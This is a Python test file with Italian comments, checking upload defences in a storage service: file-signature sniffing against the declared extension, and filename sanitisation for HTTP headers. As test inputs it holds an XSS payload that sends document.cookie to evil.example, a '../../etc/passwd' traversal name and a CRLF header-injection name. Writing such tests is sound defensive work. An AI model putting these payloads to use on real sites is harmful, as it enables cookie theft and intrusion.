"""
Test per le funzioni di sicurezza sull'upload documenti aggiunte per colmare
i gap segnalati: verifica che i byte reali del file corrispondano
all'estensione dichiarata (non fidarsi di nome file / Content-Type del
browser) e sanitizzazione del nome file prima di riusarlo in un header HTTP.

Puramente logica, nessuna dipendenza da DB/S3: esegui con
    python -m pytest tests/test_document_upload_security.py -v
"""
import sys

sys.path.insert(0, ".")

from services.storage_service import _sniff_matches_extension, _looks_like_html_or_script, sanitize_filename


# ---------- _sniff_matches_extension: casi validi ----------

def test_pdf_valido_riconosciuto():
    assert _sniff_matches_extension(b"%PDF-1.7\n%...resto del file...", "pdf")


def test_png_valido_riconosciuto():
    assert _sniff_matches_extension(b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "png")


def test_jpeg_valido_riconosciuto():
    assert _sniff_matches_extension(b"\xff\xd8\xff\xe0" + b"\x00" * 20, "jpeg")


def test_docx_valido_riconosciuto():
    # docx/xlsx sono contenitori ZIP (Office Open XML)
    assert _sniff_matches_extension(b"PK\x03\x04" + b"\x00" * 20, "docx")


def test_doc_legacy_ole2_riconosciuto():
    assert _sniff_matches_extension(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 10, "doc")


def test_mp4_valido_riconosciuto():
    # box 'ftyp' agli offset 4-8, non a inizio file
    assert _sniff_matches_extension(b"\x00\x00\x00\x18ftypmp42" + b"\x00" * 10, "mp4")


def test_webm_valido_riconosciuto():
    assert _sniff_matches_extension(b"\x1a\x45\xdf\xa3" + b"\x00" * 20, "webm")


def test_txt_semplice_accettato():
    assert _sniff_matches_extension(b"Note di lavoro: chiamare il cliente domani.", "txt")


# ---------- _sniff_matches_extension: il cuore del fix, contenuto camuffato ----------

def test_html_camuffato_da_txt_viene_rifiutato():
    """Il caso che ha motivato il fix: un file con estensione .txt (quindi
    passerebbe il controllo estensione) il cui contenuto è in realtà HTML/JS
    eseguibile — il vettore di stored XSS descritto nella verifica."""
    payload = b"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
    assert not _sniff_matches_extension(payload, "txt")


def test_html_tag_camuffato_da_csv_viene_rifiutato():
    payload = b"<!DOCTYPE html><html><body>innocuo in apparenza</body></html>"
    assert not _sniff_matches_extension(payload, "csv")


def test_pdf_falso_con_estensione_pdf_viene_rifiutato():
    # Contenuto testuale qualsiasi con estensione dichiarata .pdf, ma senza
    # la firma binaria reale di un PDF: deve essere rifiutato.
    assert not _sniff_matches_extension(b"questo non e' davvero un pdf", "pdf")


def test_eseguibile_rinominato_png_viene_rifiutato():
    # Un eseguibile Windows (firma MZ) con estensione .png non deve passare.
    assert not _sniff_matches_extension(b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 20, "png")


def test_file_vuoto_sempre_rifiutato():
    assert not _sniff_matches_extension(b"", "pdf")
    assert not _sniff_matches_extension(b"", "txt")


def test_estensione_sconosciuta_sempre_rifiutata():
    assert not _sniff_matches_extension(b"qualsiasi contenuto", "exe")


# ---------- sanitize_filename ----------

def test_nome_normale_invariato():
    assert sanitize_filename("Contratto Mandante 2026.pdf") == "Contratto Mandante 2026.pdf"


def test_virgolette_sostituite():
    # Le virgolette potrebbero rompere/iniettare nell'header Content-Disposition
    result = sanitize_filename('malicious".pdf')
    assert '"' not in result


def test_percorso_relativo_neutralizzato():
    result = sanitize_filename("../../etc/passwd")
    # L'unica proprietà che conta davvero: nessun separatore di percorso può
    # sopravvivere. I punti letterali che restano (es. ".._.._etc_passwd")
    # sono innocui qui — il path di storage reale non usa comunque questo
    # campo, che serve solo per la visualizzazione/Content-Disposition.
    assert "/" not in result
    assert "\\" not in result


def test_caratteri_di_controllo_rimossi():
    result = sanitize_filename("file\r\nX-Injected-Header: evil.pdf")
    assert "\r" not in result and "\n" not in result


def test_stringa_vuota_usa_fallback():
    assert sanitize_filename("") == "file"
    assert sanitize_filename(None) == "file"


def test_nome_troppo_lungo_troncato():
    result = sanitize_filename("a" * 500 + ".pdf")
    assert len(result) <= 200


def test_accenti_italiani_preservati():
    assert sanitize_filename("Città più bella è.pdf") == "Città più bella è.pdf"
